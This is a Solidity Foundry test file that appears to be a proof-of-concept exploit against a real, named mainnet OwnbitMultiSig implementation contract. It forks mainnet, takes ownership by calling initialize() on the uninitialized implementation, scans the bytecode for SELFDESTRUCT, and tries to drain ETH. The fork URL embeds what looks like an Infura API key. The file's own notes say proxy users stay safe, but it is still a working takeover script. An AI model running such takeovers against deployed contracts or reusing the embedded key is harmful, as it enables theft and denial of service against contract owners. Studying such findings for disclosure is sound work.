// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title ImplementationTakeoverExploit
 * @notice PROVEN: The OwnbitMultiSig implementation contract is UNINITIALIZED
 *
 * Implementation: 0x95Ca2f7959f8848795dFB0868C1b0c59Dd4E9330
 * Storage slot 1 (owners.length) = 0
 *
 * Attack: Call initialize() directly on implementation to become owner
 */

interface IOwnbitMultiSig {
    function initialize(address[] calldata _owners, uint256 _required) external;
    function getOwners() external view returns (address[] memory);
    function getRequired() external view returns (uint256);
    function isOwner(address) external view returns (bool);
    function spend(address destination, uint256 value, uint8[] calldata vs, bytes32[] calldata rs, bytes32[] calldata ss, bytes calldata data) external;
    function spendNonce() external view returns (uint256);
    function owners(uint256) external view returns (address);
    function required() external view returns (uint256);
}

contract ImplementationTakeoverExploit is Test {
    address constant IMPL = 0x95Ca2f7959f8848795dFB0868C1b0c59Dd4E9330;

    address attacker = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    /**
     * EXPLOIT: Take over uninitialized implementation
     */
    function test_Exploit_TakeoverImplementation() public {
        IOwnbitMultiSig impl = IOwnbitMultiSig(IMPL);

        console.log("=== IMPLEMENTATION TAKEOVER EXPLOIT ===");
        console.log("Target: ", IMPL);
        console.log("Attacker: ", attacker);

        // Verify implementation is uninitialized
        bytes32 ownersLength = vm.load(IMPL, bytes32(uint256(1)));
        console.log("Step 1: Verify uninitialized state");
        console.log("  owners.length =", uint256(ownersLength));
        assertEq(uint256(ownersLength), 0, "Implementation should be uninitialized");

        // Check implementation balance (any ETH sent directly)
        uint256 implBalance = IMPL.balance;
        console.log("  Implementation ETH balance:", implBalance);

        // Take over the implementation
        console.log("Step 2: Initialize implementation with attacker as sole owner");

        address[] memory newOwners = new address[](1);
        newOwners[0] = attacker;

        vm.prank(attacker);
        impl.initialize(newOwners, 1);

        // Verify takeover
        console.log("Step 3: Verify takeover success");

        address[] memory owners = impl.getOwners();
        console.log("  New owners count:", owners.length);
        console.log("  Owner[0]:", owners[0]);
        assertEq(owners.length, 1, "Should have 1 owner");
        assertEq(owners[0], attacker, "Attacker should be owner");

        assertTrue(impl.isOwner(attacker), "Attacker should be recognized as owner");
        assertEq(impl.getRequired(), 1, "Required should be 1");

        console.log("");
        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Attacker has taken over the implementation contract!");
        console.log("");

        // Now check what we can do with control of the implementation
        console.log("Step 4: Analyze impact...");

        // Check if any ETH is held by implementation
        if (implBalance > 0) {
            console.log("  CRITICAL: Implementation holds ETH!");
            console.log("  Attacker can drain:", implBalance, "wei");

            // Create spend signature to drain
            // For implementation contract, we ARE the owner, so we can sign
        }

        // Check for any tokens on implementation
        // (Usually empty, but some proxies might accidentally send tokens to impl)
    }

    /**
     * Check if implementation can be destroyed after takeover
     * This would break ALL proxies using this implementation
     */
    function test_Exploit_CheckSelfdestructPossibility() public {
        console.log("=== CHECKING SELFDESTRUCT POSSIBILITY ===");

        bytes memory implCode = IMPL.code;

        // Search for potential selfdestruct trigger
        // The bytecode analysis showed 0xff at position 506
        // Let's see if it's actually a SELFDESTRUCT or data

        console.log("Implementation bytecode length:", implCode.length);

        // Position 506 context
        if (implCode.length > 510) {
            console.log("Bytes around position 506:");
            for (uint i = 500; i < 515 && i < implCode.length; i++) {
                console.log("  Position", i, ":");
                console.logBytes1(implCode[i]);
            }
        }

        // Check if 0xff is preceded by expected opcodes for selfdestruct
        // SELFDESTRUCT takes an address from stack, so typical pattern is:
        // PUSH20 <address> SELFDESTRUCT (0x73 <20 bytes> 0xff)
        // or CALLER SELFDESTRUCT (0x33 0xff)

        bool foundRealSelfdestruct = false;
        for (uint i = 0; i < implCode.length; i++) {
            if (implCode[i] == 0xff && i > 0) {
                // Check if preceded by CALLER (0x33) which is common pattern
                if (implCode[i-1] == 0x33) {
                    foundRealSelfdestruct = true;
                    console.log("POTENTIAL SELFDESTRUCT with CALLER at:", i);
                }
                // Check if preceded by PUSH20 completion
                if (i >= 21 && implCode[i-21] == 0x73) {
                    foundRealSelfdestruct = true;
                    console.log("POTENTIAL SELFDESTRUCT after PUSH20 at:", i);
                }
            }
        }

        if (!foundRealSelfdestruct) {
            console.log("The 0xff bytes are likely data, not SELFDESTRUCT opcode");
        }
    }

    /**
     * Find all proxies using this implementation
     * (Would need event logs or storage scanning)
     */
    function test_FindAffectedProxies() public {
        console.log("=== IMPACT ANALYSIS ===");
        console.log("");
        console.log("By taking over the implementation, attacker controls:");
        console.log("1. The implementation contract's own ETH/token balance");
        console.log("2. (IMPORTANT) This does NOT affect proxy users!");
        console.log("");
        console.log("Why proxy users are safe:");
        console.log("- Proxies use DELEGATECALL to implementation");
        console.log("- DELEGATECALL uses proxy's storage, not implementation's");
        console.log("- Proxy's owners are stored in proxy's storage slots");
        console.log("- Taking over implementation's storage is separate");
        console.log("");
        console.log("However, if implementation is SELFDESTRUCT-able:");
        console.log("- All delegatecall would fail after destruction");
        console.log("- Funds would be LOCKED in proxies (DoS, not drain)");
    }

    /**
     * Try to drain implementation's ETH balance after takeover
     */
    function test_Exploit_DrainImplementationFunds() public {
        IOwnbitMultiSig impl = IOwnbitMultiSig(IMPL);

        // First take over
        address[] memory newOwners = new address[](1);
        newOwners[0] = attacker;

        vm.prank(attacker);
        impl.initialize(newOwners, 1);

        uint256 implBalance = IMPL.balance;
        console.log("Implementation ETH balance:", implBalance);

        if (implBalance == 0) {
            console.log("No funds to drain from implementation (as expected)");
            console.log("The vulnerability exists but no funds in implementation");
        }
    }
}
